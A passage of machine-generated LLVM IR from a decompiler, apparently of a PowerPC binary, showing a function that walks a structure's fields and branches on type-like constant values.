dec_label_pc_10005e08:                            ; preds = %dec_label_pc_10005dc0, %dec_label_pc_10005df0
  %v0_10005e18 = phi i32 [ %v0_10005dc8, %dec_label_pc_10005dc0 ], [ %v0_10005e18.pre, %dec_label_pc_10005df0 ]
  store i32 %v0_10005dc0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10005e18

; uselistorder directives
  uselistorder i32 ()* @function_10005e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10005e08, { 1, 0 }
}

define i32 @function_10005e1c() local_unnamed_addr {
dec_label_pc_10005e1c:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10005e1c = load i32, i32* @r3, align 4
  %v1_10005e1c = add i32 %v0_10005e1c, 24
  %v2_10005e1c = inttoptr i32 %v1_10005e1c to i32*
  %v3_10005e1c = load i32, i32* %v2_10005e1c, align 4
  store i32 %v3_10005e1c, i32* %r0.global-to-local, align 4
  %v1_10005e20 = add i32 %v0_10005e1c, 88
  store i32 %v1_10005e20, i32* %r8.global-to-local, align 4
  %v1_10005e24 = add i32 %v0_10005e1c, 8
  %v2_10005e24 = inttoptr i32 %v1_10005e24 to i32*
  %v3_10005e24 = load i32, i32* %v2_10005e24, align 4
  store i32 %v3_10005e24, i32* %r9.global-to-local, align 4
  %v2_10005e28 = icmp sgt i32 %v3_10005e1c, 0
  %v3_10005e28 = icmp eq i32 %v3_10005e1c, 0
  store i1 %v2_10005e28, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005e28, label %dec_label_pc_10005e30, label %dec_label_pc_1000601c

dec_label_pc_10005e30:                            ; preds = %dec_label_pc_10005e1c
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10005e34 = icmp ne i32 %v3_10005e24, -2147483648
  %v4_10005e34 = icmp eq i32 %v3_10005e24, -2147483648
  store i1 %v3_10005e34, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10005e34, label %dec_label_pc_10005e3c, label %dec_label_pc_10005e7c

dec_label_pc_10005e3c:                            ; preds = %dec_label_pc_10005e30
  %v1_10005e3c = add i32 %v0_10005e1c, 76
  %v2_10005e3c = inttoptr i32 %v1_10005e3c to i8*
  %v3_10005e3c = load i8, i8* %v2_10005e3c, align 1
  %v4_10005e3c = zext i8 %v3_10005e3c to i32
  store i32 %v4_10005e3c, i32* %r10.global-to-local, align 4
  store i32 %v1_10005e3c, i32* %r11.global-to-local, align 4
  %v2_10005e44 = icmp ugt i8 %v3_10005e3c, 8
  store i1 %v2_10005e44, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_10005e3c, 7
  br i1 %tmp, label %dec_label_pc_10005e64, label %dec_label_pc_10005e4c

dec_label_pc_10005e4c:                            ; preds = %dec_label_pc_10005e3c
  %v1_10005e4c = add i32 %v0_10005e1c, 84
  %v2_10005e4c = inttoptr i32 %v1_10005e4c to i32*
  %v3_10005e4c = load i32, i32* %v2_10005e4c, align 4
  %v1_10005e50 = mul nuw nsw i32 %v4_10005e3c, 4
  %v2_10005e54 = add i32 %v3_10005e4c, %v1_10005e50
  store i32 %v2_10005e54, i32* %r9.global-to-local, align 4
  %v1_10005e58 = add nuw nsw i32 %v4_10005e3c, 1
  store i32 %v1_10005e58, i32* %r0.global-to-local, align 4
  %v1_10005e5c = trunc i32 %v1_10005e58 to i8
  store i8 %v1_10005e5c, i8* %v2_10005e3c, align 1
  br label %dec_label_pc_10005e70

dec_label_pc_10005e64:                            ; preds = %dec_label_pc_10005e3c
  %v1_10005e64 = add i32 %v0_10005e1c, 80
  %v2_10005e64 = inttoptr i32 %v1_10005e64 to i32*
  %v3_10005e64 = load i32, i32* %v2_10005e64, align 4
  store i32 %v3_10005e64, i32* %r9.global-to-local, align 4
  %v1_10005e68 = add i32 %v3_10005e64, 4
  store i32 %v1_10005e68, i32* %r0.global-to-local, align 4
  store i32 %v1_10005e68, i32* %v2_10005e64, align 4
  br label %dec_label_pc_10005e70

dec_label_pc_10005e70:                            ; preds = %dec_label_pc_10005e4c, %dec_label_pc_10005e64
  %v0_10005e70 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005e70 = inttoptr i32 %v0_10005e70 to i32*
  %v2_10005e70 = load i32, i32* %v1_10005e70, align 4
  store i32 %v2_10005e70, i32* %r0.global-to-local, align 4
  %v1_10005e74 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005e74 = inttoptr i32 %v1_10005e74 to i32*
  store i32 %v2_10005e70, i32* %v2_10005e74, align 4
  %v0_10005e78 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005e78 = load i32, i32* @r3, align 4
  %v2_10005e78 = add i32 %v1_10005e78, 8
  %v3_10005e78 = inttoptr i32 %v2_10005e78 to i32*
  store i32 %v0_10005e78, i32* %v3_10005e78, align 4
  %v0_10005e7c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10005e7c

dec_label_pc_10005e7c:                            ; preds = %dec_label_pc_10005e30, %dec_label_pc_10005e70
  %v2_10005eac = phi i32 [ %v0_10005e1c, %dec_label_pc_10005e30 ], [ %v0_10005e7c.pre, %dec_label_pc_10005e70 ]
  %v1_10005e7c = add i32 %v2_10005eac, 4
  %v2_10005e7c = inttoptr i32 %v1_10005e7c to i32*
  %v3_10005e7c = load i32, i32* %v2_10005e7c, align 4
  store i32 %v3_10005e7c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10005e84 = icmp ne i32 %v3_10005e7c, -2147483648
  %v4_10005e84 = icmp eq i32 %v3_10005e7c, -2147483648
  store i1 %v3_10005e84, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10005e84, label %dec_label_pc_10005e8c, label %dec_label_pc_1000600c.preheader

dec_label_pc_10005e8c:                            ; preds = %dec_label_pc_10005e7c
  %v1_10005e8c = add i32 %v2_10005eac, 76
  %v2_10005e8c = inttoptr i32 %v1_10005e8c to i8*
  %v3_10005e8c = load i8, i8* %v2_10005e8c, align 1
  %v4_10005e8c = zext i8 %v3_10005e8c to i32
  store i32 %v4_10005e8c, i32* %r10.global-to-local, align 4
  store i32 %v1_10005e8c, i32* %r11.global-to-local, align 4
  %v2_10005e94 = icmp ugt i8 %v3_10005e8c, 8
  store i1 %v2_10005e94, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_10005e8c, 7
  br i1 %tmp22, label %dec_label_pc_10005eb4, label %dec_label_pc_10005e9c

dec_label_pc_10005e9c:                            ; preds = %dec_label_pc_10005e8c
  %v1_10005e9c = add i32 %v2_10005eac, 84
  %v2_10005e9c = inttoptr i32 %v1_10005e9c to i32*
  %v3_10005e9c = load i32, i32* %v2_10005e9c, align 4
  %v1_10005ea0 = mul nuw nsw i32 %v4_10005e8c, 4
  %v2_10005ea4 = add i32 %v3_10005e9c, %v1_10005ea0
  store i32 %v2_10005ea4, i32* %r9.global-to-local, align 4
  %v1_10005ea8 = add nuw nsw i32 %v4_10005e8c, 1
  store i32 %v1_10005ea8, i32* %r0.global-to-local, align 4
  %v1_10005eac = trunc i32 %v1_10005ea8 to i8
  store i8 %v1_10005eac, i8* %v2_10005e8c, align 1
  br label %dec_label_pc_10005ec0

dec_label_pc_10005eb4:                            ; preds = %dec_label_pc_10005e8c
  %v1_10005eb4 = add i32 %v2_10005eac, 80
  %v2_10005eb4 = inttoptr i32 %v1_10005eb4 to i32*
  %v3_10005eb4 = load i32, i32* %v2_10005eb4, align 4
  store i32 %v3_10005eb4, i32* %r9.global-to-local, align 4
  %v1_10005eb8 = add i32 %v3_10005eb4, 4
  store i32 %v1_10005eb8, i32* %r0.global-to-local, align 4
  store i32 %v1_10005eb8, i32* %v2_10005eb4, align 4
  br label %dec_label_pc_10005ec0

dec_label_pc_10005ec0:                            ; preds = %dec_label_pc_10005e9c, %dec_label_pc_10005eb4
  %v0_10005ec0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005ec0 = inttoptr i32 %v0_10005ec0 to i32*
  %v2_10005ec0 = load i32, i32* %v1_10005ec0, align 4
  store i32 %v2_10005ec0, i32* %r0.global-to-local, align 4
  %v1_10005ec4 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005ec4 = inttoptr i32 %v1_10005ec4 to i32*
  store i32 %v2_10005ec0, i32* %v2_10005ec4, align 4
  %v0_10005ec8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005ec8 = load i32, i32* @r3, align 4
  %v2_10005ec8 = add i32 %v1_10005ec8, 4
  %v3_10005ec8 = inttoptr i32 %v2_10005ec8 to i32*
  store i32 %v0_10005ec8, i32* %v3_10005ec8, align 4
  %v0_1000600c5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000600c.preheader

dec_label_pc_1000600c.preheader:                  ; preds = %dec_label_pc_10005e7c, %dec_label_pc_10005ec0
  %v0_1000600c5 = phi i32 [ %v2_10005eac, %dec_label_pc_10005e7c ], [ %v0_1000600c5.pre, %dec_label_pc_10005ec0 ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000600c6 = add i32 %v0_1000600c5, 28
  %v2_1000600c7 = inttoptr i32 %v1_1000600c6 to i32*
  %v3_1000600c8 = load i32, i32* %v2_1000600c7, align 4
  store i32 %v3_1000600c8, i32* %r0.global-to-local, align 4
  %v2_100060109 = icmp sgt i32 %v3_1000600c8, 0
  %v3_1000601010 = icmp slt i32 %v3_1000600c8, 0
  store i1 %v3_1000601010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100060109, label %dec_label_pc_10005ed4, label %dec_label_pc_1000605c

dec_label_pc_10005ed4:                            ; preds = %dec_label_pc_1000600c.preheader, %dec_label_pc_10006008
  %v2_10005fe8 = phi i32 [ %v0_1000600c, %dec_label_pc_10006008 ], [ %v0_1000600c5, %dec_label_pc_1000600c.preheader ]
  %v0_10005ed4 = phi i32 [ %v1_10006008, %dec_label_pc_10006008 ], [ 0, %dec_label_pc_1000600c.preheader ]
  %v1_10005ed4 = mul i32 %v0_10005ed4, 4
  %v2_10005ed8 = add i32 %v1_10005ed4, %v2_10005fe8
  store i32 %v2_10005ed8, i32* %r9.global-to-local, align 4
  %v1_10005edc = add i32 %v2_10005ed8, 40
  %v2_10005edc = inttoptr i32 %v1_10005edc to i32*
  %v3_10005edc = load i32, i32* %v2_10005edc, align 4
  store i32 %v3_10005edc, i32* %r0.global-to-local, align 4
  %v2_10005ee0 = icmp sgt i32 %v3_10005edc, 8
  %v3_10005ee0 = icmp eq i32 %v3_10005edc, 8
  store i1 %v2_10005ee0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005ee0, label %dec_label_pc_10006008, label %dec_label_pc_10005ee8

dec_label_pc_10005ee8:                            ; preds = %dec_label_pc_10005ed4
  %v1_10005ee8 = add i32 %v2_10005fe8, 76
  store i32 %v1_10005ee8, i32* %r10.global-to-local, align 4
  br i1 %v2_10005ee0, label %dec_label_pc_10005f04, label %dec_label_pc_10005ef0

dec_label_pc_10005ef0:                            ; preds = %dec_label_pc_10005ee8
  %v2_10005ef0 = icmp sgt i32 %v3_10005edc, 2
  store i1 %v2_10005ef0, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_10005edc, 3
  br i1 %tmp23, label %dec_label_pc_10005fcc, label %dec_label_pc_10005f1c

dec_label_pc_10005f04:                            ; preds = %dec_label_pc_10005ee8
  %v2_10005f04 = icmp sgt i32 %v3_10005edc, 1024
  store i1 %v2_10005f04, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_10005edc, 1025
  br i1 %tmp24, label %dec_label_pc_10005fcc, label %dec_label_pc_10005f10

dec_label_pc_10005f10:                            ; preds = %dec_label_pc_10005f04
  %v2_10005f10 = icmp sgt i32 %v3_10005edc, 2048
  %v3_10005f10 = icmp eq i32 %v3_10005edc, 2048
  store i1 %v2_10005f10, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005f10, label %dec_label_pc_10005f24, label %dec_label_pc_10005f18

dec_label_pc_10005f18:                            ; preds = %dec_label_pc_10005f10
  %v2_10005f18 = icmp sgt i32 %v3_10005edc, 2055
  %v3_10005f18 = icmp eq i32 %v3_10005edc, 2055
  store i1 %v2_10005f18, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005f18, label %dec_label_pc_10005f80, label %dec_label_pc_10005fcc

dec_label_pc_10005f1c:                            ; preds = %dec_label_pc_10005ef0
  %v3_10005efc = icmp eq i32 %v3_10005edc, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10005efc, label %dec_label_pc_10005f80, label %dec_label_pc_10005fcc

dec_label_pc_10005f24:                            ; preds = %dec_label_pc_10005f10
  %v2_10005f24 = inttoptr i32 %v1_10005ee8 to i8*
  %v3_10005f24 = load i8, i8* %v2_10005f24, align 1
  %v4_10005f24 = zext i8 %v3_10005f24 to i32
  %v2_10005f28 = icmp ugt i8 %v3_10005f24, 6
  store i1 %v2_10005f28, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_10005f24, 2
  %v1_10005f2c = zext i8 %tmp28 to i32
  store i32 %v1_10005f2c, i32* %r9.global-to-local, align 4
  %v2_10005f30 = add nuw nsw i32 %v1_10005f2c, %v4_10005f24
  store i32 %v2_10005f30, i32* %r0.global-to-local, align 4
  %v1_10005f34 = trunc i32 %v2_10005f30 to i8
  store i8 %v1_10005f34, i8* %v2_10005f24, align 1
  %v0_10005f38 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_10005f38, label %dec_label_pc_10005f58, label %dec_label_pc_10005f3c

dec_label_pc_10005f3c:                            ; preds = %dec_label_pc_10005f24
  %v0_10005f3c = load i32, i32* %r0.global-to-local, align 4
  %v1_10005f3c = urem i32 %v0_10005f3c, 256
  store i32 %v1_10005f3c, i32* %r9.global-to-local, align 4
  %v0_10005f40 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005f40 = add i32 %v0_10005f40, 8
  %v2_10005f40 = inttoptr i32 %v1_10005f40 to i32*
  %v3_10005f40 = load i32, i32* %v2_10005f40, align 4
  %v1_10005f44 = mul nuw nsw i32 %v1_10005f3c, 4
  store i32 %v1_10005f44, i32* %r0.global-to-local, align 4
  %v1_10005f48 = add nuw nsw i32 %v1_10005f3c, 2
  store i32 %v1_10005f48, i32* %r9.global-to-local, align 4
  %v2_10005f4c = add i32 %v3_10005f40, %v1_10005f44
  store i32 %v2_10005f4c, i32* %r11.global-to-local, align 4
  %v1_10005f50 = trunc i32 %v1_10005f48 to i8
  %v2_10005f50 = load i32, i32* @r3, align 4
  %v3_10005f50 = add i32 %v2_10005f50, 76
  %v4_10005f50 = inttoptr i32 %v3_10005f50 to i8*
  store i8 %v1_10005f50, i8* %v4_10005f50, align 1
  br label %dec_label_pc_10005f6c

dec_label_pc_10005f58:                            ; preds = %dec_label_pc_10005f24
  %v0_10005f58 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005f58 = add i32 %v0_10005f58, 4
  %v2_10005f58 = inttoptr i32 %v1_10005f58 to i32*
  %v3_10005f58 = load i32, i32* %v2_10005f58, align 4
  %v1_10005f5c = add i32 %v3_10005f58, 7
  store i32 %v1_10005f5c, i32* %r9.global-to-local, align 4
  %v1_10005f60 = call i32 @__asm_rlwinm(i32 %v1_10005f5c, i32 0, i32 0, i32 28)
  store i32 %v1_10005f60, i32* %r11.global-to-local, align 4
  %v1_10005f64 = add i32 %v1_10005f60, 8
  store i32 %v1_10005f64, i32* %r0.global-to-local, align 4
  %v1_10005f68 = load i32, i32* %r10.global-to-local, align 4
  %v2_10005f68 = add i32 %v1_10005f68, 4
  %v3_10005f68 = inttoptr i32 %v2_10005f68 to i32*
  store i32 %v1_10005f64, i32* %v3_10005f68, align 4
  br label %dec_label_pc_10005f6c

dec_label_pc_10005f6c:                            ; preds = %dec_label_pc_10005f3c, %dec_label_pc_10005f58
  %v0_10005f6c = load i32, i32* %r11.global-to-local, align 4
  %v1_10005f6c = inttoptr i32 %v0_10005f6c to i32*
  %v2_10005f6c = load i32, i32* %v1_10005f6c, align 4
  store i32 %v2_10005f6c, i32* %r9.global-to-local, align 4
  %v1_10005f70 = add i32 %v0_10005f6c, 4
  %v2_10005f70 = inttoptr i32 %v1_10005f70 to i32*
  %v3_10005f70 = load i32, i32* %v2_10005f70, align 4
  store i32 %v3_10005f70, i32* %r10.global-to-local, align 4
  %v1_10005f74 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005f74 = inttoptr i32 %v1_10005f74 to i32*
  store i32 %v2_10005f6c, i32* %v2_10005f74, align 4
  %v0_10005f78 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005f78 = load i32, i32* %r8.global-to-local, align 4
  %v2_10005f78 = add i32 %v1_10005f78, 4
  %v3_10005f78 = inttoptr i32 %v2_10005f78 to i32*
  store i32 %v0_10005f78, i32* %v3_10005f78, align 4
  br label %dec_label_pc_10006004

dec_label_pc_10005f80:                            ; preds = %dec_label_pc_10005f18, %dec_label_pc_10005f1c
  store i32 %v1_10005ee8, i32* %r10.global-to-local, align 4
  %v1_10005f84 = add i32 %v2_10005fe8, 77
  %v2_10005f84 = inttoptr i32 %v1_10005f84 to i8*
  %v3_10005f84 = load i8, i8* %v2_10005f84, align 1
  %v4_10005f84 = zext i8 %v3_10005f84 to i32
  store i32 %v4_10005f84, i32* %r11.global-to-local, align 4
  %v2_10005f88 = icmp ugt i8 %v3_10005f84, 8
  store i1 %v2_10005f88, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_10005f84, 7
  br i1 %tmp25, label %dec_label_pc_10005fac, label %dec_label_pc_10005f90

dec_label_pc_10005f90:                            ; preds = %dec_label_pc_10005f80
  %v1_10005f90 = add i32 %v2_10005fe8, 84
  %v2_10005f90 = inttoptr i32 %v1_10005f90 to i32*
  %v3_10005f90 = load i32, i32* %v2_10005f90, align 4
  %v1_10005f94 = mul nuw nsw i32 %v4_10005f84, 8
  %v1_10005f98 = add nuw nsw i32 %v1_10005f94, 32
  %v2_10005f9c = add i32 %v1_10005f98, %v3_10005f90
  store i32 %v2_10005f9c, i32* %r9.global-to-local, align 4
  %v1_10005fa0 = add nuw nsw i32 %v4_10005f84, 1
  store i32 %v1_10005fa0, i32* %r0.global-to-local, align 4
  %v1_10005fa4 = trunc i32 %v1_10005fa0 to i8
  store i8 %v1_10005fa4, i8* %v2_10005f84, align 1
  br label %dec_label_pc_10006004

dec_label_pc_10005fac:                            ; preds = %dec_label_pc_10005f80
  %v1_10005fac = add i32 %v2_10005fe8, 80
  %v2_10005fac = inttoptr i32 %v1_10005fac to i32*
  %v3_10005fac = load i32, i32* %v2_10005fac, align 4
  %v1_10005fb0 = add i32 %v3_10005fac, 7
  store i32 %v1_10005fb0, i32* %r9.global-to-local, align 4
  %v1_10005fb4 = call i32 @__asm_rlwinm(i32 %v1_10005fb0, i32 0, i32 0, i32 28)
  store i32 %v1_10005fb4, i32* %r9.global-to-local, align 4
  %v1_10005fb8 = add i32 %v1_10005fb4, 8
  store i32 %v1_10005fb8, i32* %r0.global-to-local, align 4
  %v1_10005fbc = load i32, i32* %r10.global-to-local, align 4
  %v2_10005fbc = add i32 %v1_10005fbc, 4
  %v3_10005fbc = inttoptr i32 %v2_10005fbc to i32*
  store i32 %v1_10005fb8, i32* %v3_10005fbc, align 4
  br label %dec_label_pc_10006004

dec_label_pc_10005fcc:                            ; preds = %dec_label_pc_10005f18, %dec_label_pc_10005f1c, %dec_label_pc_10005f04, %dec_label_pc_10005ef0
  %v2_10005fcc = inttoptr i32 %v1_10005ee8 to i8*
  %v3_10005fcc = load i8, i8* %v2_10005fcc, align 1
  %v4_10005fcc = zext i8 %v3_10005fcc to i32
  store i32 %v4_10005fcc, i32* %r11.global-to-local, align 4
  %v2_10005fd0 = icmp ugt i8 %v3_10005fcc, 8
  store i1 %v2_10005fd0, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_10005fcc, 7
  br i1 %tmp26, label %dec_label_pc_10005ff0, label %dec_label_pc_10005fd8

dec_label_pc_10005fd8:                            ; preds = %dec_label_pc_10005fcc
  %v1_10005fd8 = add i32 %v2_10005fe8, 84
  %v2_10005fd8 = inttoptr i32 %v1_10005fd8 to i32*
  %v3_10005fd8 = load i32, i32* %v2_10005fd8, align 4
  %v1_10005fdc = mul nuw nsw i32 %v4_10005fcc, 4
  %v2_10005fe0 = add i32 %v3_10005fd8, %v1_10005fdc
  store i32 %v2_10005fe0, i32* %r9.global-to-local, align 4
  %v1_10005fe4 = add nuw nsw i32 %v4_10005fcc, 1
  store i32 %v1_10005fe4, i32* %r0.global-to-local, align 4
  %v1_10005fe8 = trunc i32 %v1_10005fe4 to i8
  store i8 %v1_10005fe8, i8* %v2_10005fcc, align 1
  br label %dec_label_pc_10005ffc

dec_label_pc_10005ff0:                            ; preds = %dec_label_pc_10005fcc
  %v1_10005ff0 = add i32 %v2_10005fe8, 80
  %v2_10005ff0 = inttoptr i32 %v1_10005ff0 to i32*
  %v3_10005ff0 = load i32, i32* %v2_10005ff0, align 4
  store i32 %v3_10005ff0, i32* %r9.global-to-local, align 4
  %v1_10005ff4 = add i32 %v3_10005ff0, 4
  store i32 %v1_10005ff4, i32* %r0.global-to-local, align 4
  store i32 %v1_10005ff4, i32* %v2_10005ff0, align 4
  br label %dec_label_pc_10005ffc

dec_label_pc_10005ffc:                            ; preds = %dec_label_pc_10005fd8, %dec_label_pc_10005ff0
  %v0_10005ffc = load i32, i32* %r9.global-to-local, align 4
  %v1_10005ffc = inttoptr i32 %v0_10005ffc to i32*
  %v2_10005ffc = load i32, i32* %v1_10005ffc, align 4
  store i32 %v2_10005ffc, i32* %r0.global-to-local, align 4
  %v1_10006000 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006000 = inttoptr i32 %v1_10006000 to i32*
  store i32 %v2_10005ffc, i32* %v2_10006000, align 4
  br label %dec_label_pc_10006004

dec_label_pc_10006004:                            ; preds = %dec_label_pc_10005fac, %dec_label_pc_10005f90, %dec_label_pc_10005f6c, %dec_label_pc_10005ffc
  %v0_10006004 = load i32, i32* %r8.global-to-local, align 4
  %v1_10006004 = add i32 %v0_10006004, 8
  store i32 %v1_10006004, i32* %r8.global-to-local, align 4
  %v0_10006008.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000600c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10006008

dec_label_pc_10006008:                            ; preds = %dec_label_pc_10005ed4, %dec_label_pc_10006004
  %v0_1000600c = phi i32 [ %v2_10005fe8, %dec_label_pc_10005ed4 ], [ %v0_1000600c.pre, %dec_label_pc_10006004 ]
  %v0_10006008 = phi i32 [ %v0_10005ed4, %dec_label_pc_10005ed4 ], [ %v0_10006008.pre, %dec_label_pc_10006004 ]
  %v1_10006008 = add i32 %v0_10006008, 1
  store i32 %v1_10006008, i32* %r7.global-to-local, align 4
  %v1_1000600c = add i32 %v0_1000600c, 28
  %v2_1000600c = inttoptr i32 %v1_1000600c to i32*
  %v3_1000600c = load i32, i32* %v2_1000600c, align 4
  store i32 %v3_1000600c, i32* %r0.global-to-local, align 4
  %v2_10006010 = icmp slt i32 %v1_10006008, %v3_1000600c
  %v3_10006010 = icmp sgt i32 %v1_10006008, %v3_1000600c
  store i1 %v3_10006010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_10006010, label %dec_label_pc_10005ed4, label %dec_label_pc_1000605c

dec_label_pc_1000601c:                            ; preds = %dec_label_pc_10005e1c
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_10006020 = icmp ne i32 %v3_10005e24, -2147483648
  %v4_10006020 = icmp eq i32 %v3_10005e24, -2147483648
  store i1 %v3_10006020, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10006020, label %dec_label_pc_10006028, label %dec_label_pc_1000603c

dec_label_pc_10006028:                            ; preds = %dec_label_pc_1000601c
  %v1_10006028 = add i32 %v0_10005e1c, 36
  %v2_10006028 = inttoptr i32 %v1_10006028 to i8*
  %v3_10006028 = load i8, i8* %v2_10006028, align 1
  %v4_10006028 = zext i8 %v3_10006028 to i32
  %v1_1000602c = mul nuw nsw i32 %v4_10006028, 8
  %v2_10006030 = add i32 %v1_1000602c, %v1_10005e20
  store i32 %v2_10006030, i32* %r9.global-to-local, align 4
  %v1_10006034 = add i32 %v2_10006030, -8
  %v2_10006034 = inttoptr i32 %v1_10006034 to i32*
  %v3_10006034 = load i32, i32* %v2_10006034, align 4
  store i32 %v3_10006034, i32* %r0.global-to-local, align 4
  store i32 %v3_10006034, i32* %v2_10005e24, align 4
  %v0_1000603c.pre = load i32, i32* @r3, align 4
  %v1_10006040.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000603c

dec_label_pc_1000603c:                            ; preds = %dec_label_pc_1000601c, %dec_label_pc_10006028
  %v1_10006040 = phi i32 [ -2147483648, %dec_label_pc_1000601c ], [ %v1_10006040.pre, %dec_label_pc_10006028 ]
  %v1_10006058 = phi i32 [ %v0_10005e1c, %dec_label_pc_1000601c ], [ %v0_1000603c.pre, %dec_label_pc_10006028 ]
  %v1_1000603c = add i32 %v1_10006058, 4
  %v2_1000603c = inttoptr i32 %v1_1000603c to i32*
  %v3_1000603c = load i32, i32* %v2_1000603c, align 4
  store i32 %v3_1000603c, i32* %r0.global-to-local, align 4
  %v3_10006040 = icmp sgt i32 %v3_1000603c, %v1_10006040
  %v4_10006040 = icmp eq i32 %v3_1000603c, %v1_10006040
  store i1 %v3_10006040, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10006040, label %dec_label_pc_10006048, label %dec_label_pc_1000605c

dec_label_pc_10006048:                            ; preds = %dec_label_pc_1000603c
  %v1_10006048 = add i32 %v1_10006058, 37
  %v2_10006048 = inttoptr i32 %v1_10006048 to i8*
  %v3_10006048 = load i8, i8* %v2_10006048, align 1
  %v4_10006048 = zext i8 %v3_10006048 to i32
  %v1_1000604c = mul nuw nsw i32 %v4_10006048, 8
  %v1_10006050 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006050 = add i32 %v1_1000604c, %v1_10006050
  store i32 %v2_10006050, i32* %r9.global-to-local, align 4
  %v1_10006054 = add i32 %v2_10006050, -8
  %v2_10006054 = inttoptr i32 %v1_10006054 to i32*
  %v3_10006054 = load i32, i32* %v2_10006054, align 4
  store i32 %v3_10006054, i32* %r0.global-to-local, align 4
  store i32 %v3_10006054, i32* %v2_1000603c, align 4
  %v0_1000605c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000605c

dec_label_pc_1000605c:                            ; preds = %dec_label_pc_10006008, %dec_label_pc_1000600c.preheader, %dec_label_pc_1000603c, %dec_label_pc_10006048
  %v0_1000605c = phi i32 [ %v1_10006058, %dec_label_pc_1000603c ], [ %v0_1000605c.pre, %dec_label_pc_10006048 ], [ %v0_1000600c5, %dec_label_pc_1000600c.preheader ], [ %v0_1000600c, %dec_label_pc_10006008 ]
  %v1_1000605c = add i32 %v0_1000605c, 8
  %v2_1000605c = inttoptr i32 %v1_1000605c to i32*
  %v3_1000605c = load i32, i32* %v2_1000605c, align 4
  store i32 %v3_1000605c, i32* %r11.global-to-local, align 4
  %v2_10006060 = icmp sgt i32 %v3_1000605c, 0
  store i1 %v2_10006060, i1* %cr7_gt.global-to-local, align 1
  %v0_10006064 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000605c, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_10006064)
  %v0_10006068 = load i32, i32* @r3, align 4
  %v1_10006068 = add i32 %v0_10006068, 16
  %v2_10006068 = inttoptr i32 %v1_10006068 to i32*
  %v3_10006068 = load i32, i32* %v2_10006068, align 4
  store i32 %v3_10006068, i32* %r0.global-to-local, align 4
  %v0_1000606c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000606c = sub i32 0, %v0_1000606c
  store i32 %v1_1000606c, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_10006074 = add i32 %v0_10006068, 8
  %v3_10006074 = inttoptr i32 %v2_10006074 to i32*
  store i32 %v1_1000606c, i32* %v3_10006074, align 4
  %v0_10006078 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006078 = or i32 %v0_10006078, 8
  store i32 %v1_10006078, i32* %r0.global-to-local, align 4
  %v0_1000607c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000607c = load i32, i32* @r3, align 4
  %v2_1000607c = add i32 %v1_1000607c, 20
  %v3_1000607c = inttoptr i32 %v2_1000607c to i32*
  store i32 %v0_1000607c, i32* %v3_1000607c, align 4
  %v1_10006080 = call i32 @__asm_rlwinm(i32 %v1_10006078, i32 0, i32 0, i32 30)
  store i32 %v1_10006080, i32* %r0.global-to-local, align 4
  %v1_10006084 = load i32, i32* @r3, align 4
  %v2_10006084 = add i32 %v1_10006084, 16
  %v3_10006084 = inttoptr i32 %v2_10006084 to i32*
  store i32 %v1_10006080, i32* %v3_10006084, align 4
  %v0_10006088 = load i32, i32* @r3, align 4
  ret i32 %v0_10006088

; uselistorder directives
  uselistorder i32 %v3_1000603c, { 1, 0, 2 }
  uselistorder i32 %v1_10006040, { 1, 0 }
  uselistorder i32 %v3_1000600c, { 1, 0, 2 }
  uselistorder i32 %v1_10006008, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000600c, { 0, 2, 1 }
  uselistorder i32 %v4_10005f84, { 1, 0, 2 }
